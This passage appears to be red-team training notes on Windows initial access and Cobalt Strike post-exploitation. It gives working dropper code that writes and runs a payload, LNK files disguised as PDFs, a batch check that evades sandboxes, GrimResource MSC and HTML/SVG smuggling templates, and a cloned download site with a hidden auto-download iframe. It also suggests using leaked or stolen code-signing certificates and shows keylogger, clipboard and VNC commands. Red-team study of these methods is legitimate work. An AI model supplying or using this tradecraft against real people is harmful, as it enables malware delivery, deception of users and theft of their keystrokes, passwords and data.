Some .NET techniques bypass search order entirely:

  • Startup hooks — .NET Core 3.1+, set via environment variable
  • AppDomainManager hijacking — .NET Framework; write a class inheriting AppDomainManager, compile to DLL, place malicious code in the constructor or a virtual method override
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success");
    }
}

The DLL must sit in the same directory as the .NET application that loads it. Windows ships over 100 .NET assemblies by default — including NGenTask from the previous example — which can be copied into a writable directory to host the hijack:

PS C:\Users\Attacker> cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db
gentask.exe ngentask.exe
PS C:\Users\Attacker> cp C:\Tools\AppDomainHijack\bin\Debug\AppDomainHijack.dll domainManager.dll

Two methods trigger the load. The first sets the APPDOMAIN_MANAGER_ASM and APPDOMAIN_MANAGER_TYPE environment variables:

PS C:\Users\Attacker>$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
PS C:\Users\Attacker>$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'

Running the application now loads the DLL. The second method uses the appDomainManagerAssembly and appDomainManagerType elements in a .config file prefixed with the application name (e.g. ngentask.exe.config):

<configuration>
   <runtime>
      <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />  
      <appDomainManagerType value="AppDomainHijack.DomainManager" />  
   </runtime>
</configuration>

5.1.3 Windows Installer

MSI files bundle payload and installation steps into a single file, making them effective containers. Build them in Visual Studio with the Installer Projects extension. Workflow:

  1. Create a new Setup Project — the default view shows the files that will be packaged.
  2. Add the payload via Add > File to a target directory (Application Folder for Program Files, User's Desktop, or User's Start Menu). Set the file's properties — hidden attribute, output filename — as needed.
  3. Add a custom action: right-click the project > View > Custom Actions, then right-click Install > Add Custom Action and select the payload from the Application folder.
  4. For a 64-bit payload, set Run64Bit to True in the action properties. Customise the command-line arguments to look legitimate.
  5. Dress up the installer via project properties — company name, product name, target platform — to control the Program Files directory name and the Control Panel entry.

Building (Build > Build Solution) produces a .exe and a .msi. The EXE is only a wrapper around the MSI and doesn't need to be delivered.

5.1.4 Excel Add-Ins

An .xlam file is a macro-enabled Excel Add-In. The main obstacle is Protected View, which disables macros when a file has MotW, was received as an email attachment, or was opened from an untrusted location. Strip MotW via a container, or drop the file into a trusted location that bypasses Protected View.

Standard users cannot write to %ProgramFiles% but can write to %APPDATA%. Excel automatically loads any workbooks, templates, or add-ins present in its XLSTART directory at startup.

To build an XLAM:

  1. Create an empty workbook and open the VB editor with Alt+F11.
  2. Right-click the VBAProject and select Insert > Module.
  3. Add macro code to the module:
Private Sub Auto_Open()
   MsgBox "Hello World", vbOKOnly, "pwned"
End Sub

Close the editor and save the workbook as an Excel Add-In (*.xlam) via File > Save As. To test, copy the XLAM into %APPDATA%\Microsoft\Excel\XLSTART and re-open Excel — the message box should appear on launch.

5.1.5 Code Signing

Signed files generate fewer SmartScreen and AV alerts, improving execution odds. The method of obtaining a signing certificate is where the controversy lies.

Two types: Standard (adds a digital signature, minor trust benefit) and EV (Extended Validation — fully trusted by SmartScreen, removes "Unknown Publisher" warnings). For initial access, EV is the target.

EV code-signing certs require verified business entities (DigiCert, GlobalSign) — not available to individuals. Signing malware with a real cert also backfires: it's obvious to defenders and gets revoked on VirusTotal submission.

Options if purchasing a legitimate EV cert isn't viable:

  • Set up a shell company (time-intensive)
  • Use leaked/stolen certificates — searchable on GitHub (path qualifier), public S3 buckets, game hacking forums

Regardless of the legal and ethical considerations, code signing should be modelled in any initial access engagement — threat actors actively use it, and defenders need representative coverage.

5.2 Droppers

A dropper delivers a payload without embedding it directly in the container — evading AV and complicating analysis. Droppers either extract embedded resources from themselves or download the payload via HTTP(S) or DNS.

The example below builds a JavaScript dropper from a .NET assembly using GadgetToJScript. Start with a new .NET Framework Class Library project in Visual Studio — it ships with an empty Class1.cs:

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
  
namespace MyDropper
{
    public class Class1
    {
    }
}

Rename Class1.cs to Dropper.cs for clarity. Right-click the project in Solution Explorer > Add > Existing Item and select a payload (e.g. http_x64.exe). In its properties, change Build Action to Embedded Resource.

GadgetToJScript executes the class constructor during deserialization, so all dropper logic must sit there. Start by reading the embedded resource via GetManifestResourceStream:

using System.Reflection;
  
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            // use reflection to get reference to own assembly
            var assembly = Assembly.GetExecutingAssembly();
  
            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
            {
                // do something
            }
        }
    }
}

Once read, the payload is dropped to disk. Avoid the user home directory or temporary directories — these are heavily monitored. Prefer standard application locations:

  • %PROGRAMFILES% — requires admin
  • %PROGRAMFILES(X86)% — requires admin
  • %PROGRAMDATA% — writable as standard user

%PROGRAMDATA% is the only one a standard user can write to. Create a subdirectory and drop the payload there:

using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
{
    // get path to ProgramData
    var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    
    // construct new path with our dir name
    var newPath = Path.Combine(path, "MyLegitApp");
    
    // create new directory inside ProgramData
    var newDir = Directory.CreateDirectory(newPath);
  
    // construct path for the executable
    var filePath = Path.Combine(newDir.FullName, "MyApp.exe");
    
    // drop the path to disk
    using (var fs = File.Create(filePath))
    {
        // copy resource stream into file stream
        rs.CopyTo(fs);
  
        // close file
        rs.Close();
    }
}

Execute the payload after writing it:

// execute it
Process.Start(filePath);

Building the project produces MyDropper.dll. Serialise it with GadgetToJScript:

PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dropper
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\dropper.js

The resulting dropper.js runs via wscript or a double-click (when wscript is the default handler for .js). Combined with a container, this produces multi-stage chains like ISO → LNK → JS → .NET DLL → EXE. The same dropper pattern can drop a DLL for COM hijacking or perform direct shellcode injection.

5.3 Triggers

The trigger is the file that the user will interact with after extracting the container. You typically want this to be as 'pain-free' as possible, like a double-click.

5.3.1 Batch

Batch files (.bat, .cmd, .btm) execute commands sequentially via cmd.exe.

  • Prepend @echo off to suppress command display
  • Append > nul 2>&1 to suppress command output

A minimal BAT trigger:

@echo off
start payload.exe
start decoy.pdf
exit

A VMRay-documented trick conditions execution on whether the BAT was double-clicked or run from a shell. Double-click execution sets cmdcmdline to cmd.exe /c ""file.bat""; running from an existing shell sets it to just cmd.exe. Compare cmdcmdline against the BAT's own path (~f0) — if missing, exit:

@echo off
echo %cmdcmdline% | find /i "%~f0" || exit
calc
exit

This defeats automated AV and sandbox analysis, where the script is invoked programmatically rather than interactively.

5.3.2 Shell Link

The .lnk extension is hidden by Explorer even with "show extensions" enabled — a file named report.pdf.lnk appears as report.pdf. Combined with a custom PDF icon, LNK files are highly deceptive triggers. Create one with the WScript.Shell COM object in PowerShell:

$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads	rigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()

A standalone ICO file can be bundled in the container and referenced by IconLocation instead of pulling from an installed application.

For an Excel Add-In payload, the LNK should copy the XLAM into the user's XLSTART directory before opening a decoy spreadsheet to trigger execution:

$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()

5.3.3 Microsoft Saved Console

GrimResource (discovered by Elastic) abuses a crafted .msc file and an unpatched XSS flaw in mmc.exe to execute JavaScript. The weaponised payload is VBScript wrapped in a stylesheet, URL-encoded, and placed on line 105 of the MSC XML. A minimal payload that spawns cmd.exe:

<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set wshshell = CreateObject("WScript.Shell")
        wshshell.run "C:\\Windows\\System32\\cmd.exe"
]]></ms:script>
</stylesheet>

URL-encode the payload with a tool like CyberChef, then in the target MSC XML find line 105:

xsl.loadXML(unescape("%3C?xml ... %3E"))

Replace the placeholder with the encoded payload:

xsl.loadXML(unescape("<ENCODED SCRIPT HERE>"))

Double-clicking the MSC launches mmc.exe, which spawns cmd.exe. mmc.exe is an auto-elevating binary — a local admin user will be presented with a UAC prompt, and the payload runs in high integrity if they accept. Automated generators like MSC_Dropper can build basic MSC payloads.

5.4 Containers

5.4.1 Mark of the Web

Mark of the Web (MotW) is a zone identifier marking files downloaded from the Internet as potentially unsafe. View it via Explorer file properties or PowerShell:

PS C:\Users\Attacker\Downloads> Get-Content -Stream Zone.Identifier .\test.pdf
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
HostUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf

MotW degrades phishing reliability — Windows shows additional warnings, and Office documents will not enable macros when the mark is present.

Containers bundle trigger, payload, and decoy into one file. Windows-native formats are preferred (ISO/IMG, ZIP, WIM) — avoid 7z and WinRAR since the target may not have the software installed. Some formats strip MotW; see Mantani's MotW comparison. Build containers with PackMyPayload:

attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Downloads$ /mnt/c/Tools/PackMyPayload/PackMyPayload.py test.pdf test.iso

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /test.pdf
[+] File packed into ISO.

[+] Generated file written to (size: 65536): test.iso

Test by hosting the container on a Python web server and pulling it down via PowerShell:

attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Downloads$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
PS C:\Users\Attacker\Downloads> iwr -Uri http://localhost:8000/test.iso -OutFile test2.iso

Once the ISO is mounted, files inside no longer carry MotW.

The -H parameter sets the hidden attribute on selected files at pack time — useful when only the trigger should be visible to the user:

$ ls -l /mnt/c/Payloads/xlam

-rwxrwxrwx 1 rasta rasta 11607 Jun 27 13:55 decoy.xlsx
-rwxrwxrwx 1 rasta rasta 12906 Jun 27 13:55 payload.xlam
-rwxrwxrwx 1 rasta rasta  2094 Jun 28 13:55 trigger.xls.lnk
$ python3 PackMyPayload.py -H decoy.xlsx,payload.xlam /mnt/c/Payloads/xlam /mnt/c/Payloads/xlam/package.img

5.5 Delivery

Delivery gets the victim to execute your initial access package. Modern environments layer firewalls, email gateways, and web proxies — simple link/attachment delivery is rarely sufficient on its own.

5.5.1 HTML Smuggling

HTML smuggling uses HTML5 and JS features to deliver files without triggering content filters. Traditional downloads fetch a file over HTTP GET, which scanners inspect; smuggling embeds the payload directly in the HTML and reconstructs it client-side, bypassing network inspection. Minimal template based on work by Stan Hegt:

<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
                const fileName = 'test.txt';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>

The payload is base64-encoded in a JS variable and decoded on click via downloadFile(), which builds a blob href to trigger the download. Proxies only see HTML/JS — no application/octet-stream. Can be enhanced with Web Crypto API AES encryption and JS obfuscation.

5.5.2 SVG Smuggling

SVG (Scalable Vector Graphics) is an XML-based vector image format. A minimal SVG looks like:

<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
   Sorry, your browser does not support inline SVG.
</svg>

SVG also allows embedded JavaScript:

<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
<script>
    alert('Hello World');
</script>
Sorry, your browser does not support inline SVG.
</svg>

Standalone .svg files open in browsers like Edge when set as the default handler, making them viable smuggling containers — the embedded JavaScript fires on open.

5.5.3 Cobalt Strike Site Clone

Cobalt Strike's site clone (Attacks > Web Drive-by > Clone Site) copies a legitimate website and embeds a URL the browser automatically downloads — no user click required. It achieves similar phishing goals to HTML smuggling without needing a custom web server. Example: cloning a download page for GPU-Z from BleepingComputer.

Host File

Host the payload on the CS team server's internal web server via Site Management > Host File. The new entry appears in Site Management > Manage; highlight the row and click Copy URL to get the hosted URL — e.g. http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe.

Clone Site

Create the clone and embed the hosted URL via Management > Clone Site. The clone returns its own URL — e.g. http://www.bleepincomputer.com:80/download/gpu-z/ — which is what the victim receives. On visit, the cloned page renders and the payload downloads automatically as GPU-Z-2.22.0.exe.

The mechanism is a hidden iframe pointing at the hosted file:

<IFRAME SRC="http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>

6. Post-Exploitation

Once a Beacon is established, the goal shifts to understanding the host and expanding access without burning the session. The standard workflow covers local and domain reconnaissance, privilege escalation, credential dumping, user impersonation, and lateral movement.

6.1 Situational Awareness

The first step after access is situational awareness — gathering information about the host, its users, network position, installed software, and security controls. Cobalt Strike provides primitives for this via built-in commands and third-party tooling injected through Beacon.

6.1.1 Command Behaviour

Beacon commands fall into categories by execution method — operators must understand the behaviour to assess detection risk against active defences.

House-Keeping

These commands exist to configure Beacon by changing a setting at runtime. These commands include sleep, spawnto, jobs, and ppid. They generally don't execute anything, but simply change or return values stored within Beacon's memory.

API-Only

These are built into Beacon and are the most benign of commands that actually perform an action. Commands that only call Win APIs include cd, cp, ls, mv, ps, pwd, rm, and upload.

Inline Execution

inline-execute runs a Beacon Object File (BOF) — a linker-less C program executed in Beacon's own memory space.

  • Pro: no new process spawned; smaller detection surface than fork & run
  • Con: BOF crash kills the Beacon

Commands like dllload, getsystem, and timestomp are BOFs. Operators can write custom BOFs too — though Beacon must do additional work to load and execute them vs. native API-only commands.

Fork & Run

Fork & run: spawns a temporary process, injects a reflective DLL, reads output over a named pipe. More stable than inline-execute but a larger detection surface. Two variants:

  • Spawn — creates a new temporary process
  • Explicit — injects into an existing process (target PID)

Check help <cmd> to identify variant — commands accepting [arch] and [pid] support explicit injection.

VariantCommands
Spawn onlyexecute-assembly, powerpick
Explicit onlypsinject
Bothmimikatz, portscan, keylogger
 
beacon> help execute-assembly
Use: execute-assembly [/path/to/file.exe] [arguments]  << spawn

beacon> help psinject
Use: psinject [pid] [arch] [commandlet] [arguments]    << explicit

beacon> help mimikatz
Use: mimikatz [pid] [arch] [module::command] <args>    << explicit
     mimikatz [module::command] <args>                 << spawn

Explicit fork-and-run is also useful for injecting into processes owned by other users. keylogger [pid] [x86|x64] against another user's process logs their keystrokes — requires sufficient privileges for the injection.

6.2 Session Passing

Session passing spawns a new Beacon from an existing one using a different listener. Common use: low-and-slow DNS Beacon for persistence, spawn a faster HTTP Beacon for active post-ex work.

The most direct way to do this is with the spawn and spawnas commands.

6.2.1 spawn

spawn starts a new process and injects shellcode for the specified listener. The new Beacon runs as the same user as the parent.

beacon> help spawn
Use: spawn [x86|x64] [listener]
     spawn [listener]

Spawn an x86 or x64 process and inject shellcode for the listener.

beacon> spawn x64 http
[*] Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (www.bleepincomputer.com:80)
[+] host called home, sent: 350863 bytes

6.2.2 spawnas

spawnas is similar but takes plaintext credentials for another user — the new Beacon runs in that user's context.

beacon> help spawnas
Use: spawnas [DOMAIN\user] [password] [listener]

Attempt to spawn a payload as another user. If you don't specify DOMAIN,
Beacon will try to authenticate as a local user.

This command will usually fail if you're in a SYSTEM context. Use make_token
to create a token to pass the desired credentials instead.

Help text often calls out command caveats — spawnas, for example, will not work from a SYSTEM Beacon because of how the underlying Windows API behaves. Watch the current working directory too: a CWD the alternate user cannot read will fail with error 267:

beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
[*] Tasked beacon to spawn windows/beacon_bind_tcp (127.0.0.1:1337) as CONTOSO\rsteel
[-] could not run C:\Windows\system32\rundll32.exe as CONTOSO\rsteel: 267

beacon> windows_error_code 267
ERROR_DIRECTORY, STATUS_NOTIFY_CLEANUP

The CWD points at a directory owned by pchilds, which rsteel cannot read:

beacon> pwd
[*] Current directory is C:\Users\pchilds\Documents

The fix is to cd to a location rsteel has access to before retrying:

beacon> cd C:\
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local

6.3 File System

Filesystem enumeration is a basic but high-value step. ls with no arguments lists the contents of the current working directory:

beacon> ls
[*] Listing: C:\\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/14/2025 13:51:00   $Recycle.Bin
          dir     03/27/2025 14:09:13   $WinREAgent
          dir     02/06/2025 20:39:37   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
          dir     03/24/2025 12:34:54   Program Files
          dir     03/24/2025 12:23:53   Program Files (x86)
          dir     03/24/2025 12:15:24   ProgramData
          dir     02/14/2025 13:40:08   Recovery
          dir     02/06/2025 20:39:45   System Volume Information
          dir     03/27/2025 14:23:12   Users
          dir     03/24/2025 12:15:02   Windows
 8kb      fil     03/27/2025 07:06:27   DumpStack.log.tmp
 1gb      fil     03/27/2025 07:06:27   pagefile.sys
 256mb    fil     03/27/2025 07:06:27   swapfile.sys

Pass a path (absolute or relative) to list a specific directory:

beacon> ls C:\Users
[*] Listing: C:\Users\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/07/2019 09:30:39   All Users
          dir     03/24/2025 12:22:38   Default
          dir     12/07/2019 09:30:39   Default User
          dir     02/07/2025 14:54:49   pchilds
          dir     02/06/2025 20:41:37   Public
          dir     03/27/2025 14:23:13   rsteel
 174b     fil     12/07/2019 09:12:42   desktop.ini

beacon> ls Users
[*] Listing: Users\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/07/2019 09:30:39   All Users
          dir     03/24/2025 12:22:38   Default
          dir     12/07/2019 09:30:39   Default User
          dir     02/07/2025 14:54:49   pchilds
          dir     02/06/2025 20:41:37   Public
          dir     03/27/2025 14:23:13   rsteel
 174b     fil     12/07/2019 09:12:42   desktop.ini

cd changes Beacon's working directory; absolute and relative paths are both accepted.

6.3.1 File Browser

The File Browser (file_browser or Explore > File Browser) loads the CWD first; unvisited directories are greyed out. Drill down by double-clicking in the central view or single-clicking the drive panel on the left. Loads are issued as Beacon jobs, so navigation cannot outpace the current check-in time.

6.4 Downloading Files

download [file] retrieves a file from the target — absolute or relative path:

beacon> download C:\Users\pchilds\Desktop\desktop.ini
[*] started download of C:\Users\pchilds\Desktop\desktop.ini (282 bytes)
[*] download of desktop.ini is complete

Downloads use the C2 channel — speed depends on protocol and sleep time. DNS (A records) is significantly slower than HTTP (POST); factor this in before downloading large files through a DNS Beacon. Use downloads to view in-progress transfers (name, total size, bytes received) and cancel to abort one.

Files land on the team server first, not the operator's machine. Sync them locally via View > Downloads — select files and click Sync Files, or Delete Files to remove from the team server. All connected operators share visibility and deletion rights.

6.5 Processes

ps lists running processes — PID, parent PID, architecture (x64/x86), session ID, and user — ordered by PID with children indented:

beacon> ps
[*] Process List

[*] This Beacon PID:    YELLOW 6400  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                                               
 88    4             Registry                                         
 388   4             smss.exe                                         
 2052  4             Memory Compression

6.5.1 Process Browser

The Process Browser (process_browser or Explore > Process List) is the GUI counterpart to ps.

6.6 Keylogger

The keylogger captures keystrokes from the user who owns the process the post-ex capability is injected into.

beacon> help keylogger
Use: keylogger [pid] [x86|x64]
     keylogger

Inject a keystroke logger into the specified process.

Use keylogger with no arguments to spawn a temporary process and inject the 
keystroke logger into it.

To terminate this task: use jobs to find the job ID. Use jobkill to kill it.

Output goes to a dedicated tab (View > Keystrokes) rather than the Beacon console. Right-click a row to Save output as a local text file or Delete it from the team server. The keylogger is a long-running job — use jobs to list and jobkill to stop it:

beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    3020  keystroke logger

beacon> jobkill 0
[+] job 0 completed

6.7 Clipboard

The clipboard command reads the user's clipboard. Text output is printed directly to the Beacon console:

beacon> help clipboard
Use: clipboard

Attempts to get text clipboard contents

beacon> clipboard
[*] Tasked beacon to get clipboard contents
Clipboard Data (22 bytes):
MySup3rS3cr3tPassw0rd!

6.8 Registry

The reg command queries the local registry. reg query lists all subkeys and values under a path; reg queryv reads a single value:

beacon> help reg
Use: reg query  [x86|x64] [root\path]
     reg queryv [x86|x64] [root\path] [subkey]

Use 'query' to query a key within the registry. Lists all subkeys and values.

Use 'queryv' to query a subkey within the registry. Lits only the subkey and 
its value.

Use HKLM, HKCR, HKCC, HKCU, or HKU for the root.

Specify x86|x64 to force a specific view of the registry.

Read the local UAC policy:

beacon> reg query x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

ConsentPromptBehaviorAdmin 5
ConsentPromptBehaviorUser 3
DSCAutomationHostEnabled 2
EnableCursorSuppression  1
EnableFullTrustStartupTasks 2
EnableInstallerDetection 1
EnableLUA                1
EnableSecureUIAPaths     1
EnableUIADesktopToggle   0
EnableUwpStartupTasks    2
EnableVirtualization     1
PromptOnSecureDesktop    1
SupportFullTrustStartupTasks 1
SupportUwpStartupTasks   1
ValidateAdminCodeSignatures 0
dontdisplaylastusername  0
legalnoticecaption       
legalnoticetext          
scforceoption            0
shutdownwithoutlogon     1
undockwithoutlogon       1
LocalAccountTokenFilterPolicy 1
Audit\
Kerberos\
UIPI\

Or read a single value:

beacon> reg queryv x64 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
ConsentPromptBehaviorAdmin 5

6.9 Screenshots

Beacon has three screenshot commands with different OPSEC profiles:

CommandMechanismOPSEC
printscreenSends PrintScr keypress; reads from clipboard; clears itLoud — clobbers user clipboard
screenshotPost-ex DLL captures the desktop directlyClean — no clipboard interaction
screenwatchLong-running variant of screenshot; one per check-inClean; tied to sleep interval

6.9.1 printscreen

printscreen sends a PrintScr keypress, then pulls the resulting screenshot from the clipboard and clears it. Use sparingly — nuking the user's clipboard is loud:

beacon> help printscreen
Use: printscreen [pid] [x86|x64]
     printscreen

Inject a screenshot tool into the specified process.

Use printscreen with no arguments to spawn a temporary process and inject the 
screenshot tool into it.

Printscreen forces a PrintScr keypress and grabs the screenshot from the
clipboard. It then exits. This command will clear the clipboard contents after
its done.

No long-running variant of this exists because... let's face it... nuking the
clipboard periodically is probably not good OPSEC.

6.9.2 screenshot

screenshot uses a post-ex DLL to capture the desktop without touching the clipboard:

beacon> help screenshot
Use: screenshot [pid] [x86|x64]
     screenshot

Inject a screenshot tool into the specified process.

Use screenshot with no arguments to spawn a temporary process and inject the 
screenshot tool into it.

Screenshot takes a picture of the visible desktop and exits.

6.9.3 screenwatch

screenwatch takes continuous screenshots on a long-running job:

beacon> help screenwatch
Use: screenwatch [pid] <x86|x64>
     screenwatch

Inject a screen watcher tool into the specified process.

Use screenwatch with no arguments to spawn a temporary process and inject the 
screen watch tool into it.

Screenwatch sends a screenshot of the user's desktop (one per Beacon check-in)
until terminated. If the user is idle, the screen watch tool will take a new
screenshot every three minutes.

To terminate this task: use jobs to find the job ID. Use jobkill to kill it.

Capture frequency is tied to Beacon's sleep time — sleep 5 for one every 5 seconds, sleep 60 for one a minute. All three commands send their output to the dedicated tab at View > Screenshots; right-click a row to Save a copy locally or Delete it from the team server.

6.10 VNC

Cobalt Strike can also inject a reflective VNC DLL to obtain remote control of the user's desktop, available via the desktop command or Explore > Desktop (VNC):

beacon> help desktop
Use: desktop [pid] [x86|x64] [high|low]
     desktop [high|low]

Injects a VNC server onto the target and connects to it. You may specify
whether or not the session is high or low-quality.

beacon> desktop high
[*] Tasked beacon to spawn VNC server
[+] started port forward on 5117 to 127.0.0.1:5117

This will create a reverse port forward on the target, which the VNC DLL will use to tunnel traffic back to the team server. The team server will also begin listening on the same port for the Cobalt Strike client to connect to.

The session is in 'view only' mode by default, but operators can take remote control over the keyboard and mouse using the buttons at the bottom of the window. Closing this tab will automatically tear down the port bindings.

6.11 Execution Commands

shell and run execute arbitrary commands on the target and return the output.

6.11.1 shell

shell runs commands through a command prompt:

beacon> help shell
Use: shell [command] [arguments]

Execute the command using cmd.exe

Arguments are wrapped in cmd.exe /c, so shell whoami /user runs on the target as cmd.exe /c whoami /user:

beacon> shell whoami /user

USER INFORMATION
----------------

User Name   SID                                         
=========== ============================================
dev\bfarmer S-1-5-21-569305411-121244042-2357301523-1104

6.11.2 run

run executes the target program directly without going through cmd.exe:

beacon> help run
Use: run [program] [arguments]

Execute the program. Returns output.

beacon> run whoami /user

USER INFORMATION
----------------

User Name   SID                                         
=========== ============================================
dev\bfarmer S-1-5-21-569305411-121244042-2357301523-1104
shellrun
Underlying processcmd.exe /cTarget program directly
Supports cmd builtins (dir, type)YesNo
Supports standalone EXEs (whoami)YesYes
OPSECSpawns cmd.exe — extra IOCCleaner process tree

Both are loud. Beacon's API-only commands generally replace the need for either — use ls over dir, getuid over whoami.

6.12 Executing Custom Tools

Common external tools used during engagements:

ToolPurpose
SeatbeltLocal host recon
PowerViewDomain enumeration via PowerShell
Certify / CertipyADCS abuse
RubeusKerberos abuse (roasting, delegation, ticket forgery)
ImpacketLateral movement, credential dumping, NTLM relay

On-host tooling is covered below; tools that operate over the network appear in the Pivoting chapter.

Beacon can execute PowerShell scripts, .NET assemblies, and reflective DLLs entirely in memory.

6.12.1 powershell

Beacon offers three PowerShell execution primitives. The first is powershell:

beacon> help powershell
Use: powershell [commandlet] [arguments]

Execute the command using powershell. Any cmdlets from the
last use of powershell-import are available here too.

This invokes powershell.exe — the PowerShell equivalent of shell (which invokes cmd.exe):

beacon> powershell $env:computername
LON-WKSTN-1

Commands are base64-encoded before execution (e.g. powershell -nop -exec bypass -EncodedCommand JABlAG4...). Operators can override this with Aggressor script hooks.

6.12.2 powerpick

beacon> help powerpick
Use: powerpick [commandlet] [arguments]
     powerpick "[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]" [commandlet] [arguments]

Execute the command using Unmanaged PowerShell. Any cmdlets from the
last use of powershell-import are available here too.

powerpick uses UnmanagedPowerShell — PowerShell APIs without powershell.exe. It's a fork-and-run command: the unmanaged PS DLL is injected into the spawnto process and output is read back over a named pipe.

beacon> powerpick $env:computername
LON-WKSTN-1

6.12.3 psinject

beacon> help psinject
Use: psinject [pid] [arch] [commandlet] [arguments]

Inject Unmanaged PowerShell into a specific process and execute the
specified command. Any cmdlets from the last use of powershell-import are 
available here too.

psinject works like powerpick but injects into an existing process instead of spawning a new one — useful for running PowerShell in another user's context, given sufficient injection privileges.

beacon> psinject 3020 x64 $PID
[*] Tasked beacon to psinject: $PID into 3020 (x64)

3020

6.12.4 Importing PowerShell Scripts

External PowerShell scripts must be imported via powershell-import before their cmdlets become available:

beacon> help powershell-import
Use: powershell-import [/path/to/local/script.ps1]

Import a powershell script which is combined with future
calls to the powershell command. You may only use one
imported script at a time.

Import PowerView, for example:

beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

The imported script is auto-loaded into the PowerShell session for subsequent powershell, powerpick, and psinject calls. Beacon hosts the script on its internal web server and the target fetches it at execution time:

beacon> powerpick Get-Domain

Forest                  : contoso.com
DomainControllers       : {lon-dc-1.contoso.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : lon-dc-1.contoso.com
RidRoleOwner            : lon-dc-1.contoso.com
InfrastructureRoleOwner : lon-dc-1.contoso.com
Name                    : contoso.com

6.12.5 .NET

execute-assembly uses a reflective DLL to host the CLR (Common Language Runtime) in the spawnto process, then loads and runs a .NET assembly from memory. Only .NET Framework assemblies are supported — .NET Core is not.

beacon> help execute-assembly
Use: execute-assembly [/path/to/file.exe] [arguments]
Use: execute-assembly "[PATCHES: [patch-rule] [patch-rule] [patch-rule] [patch-rule]]" [/path/to/file.exe] [arguments]

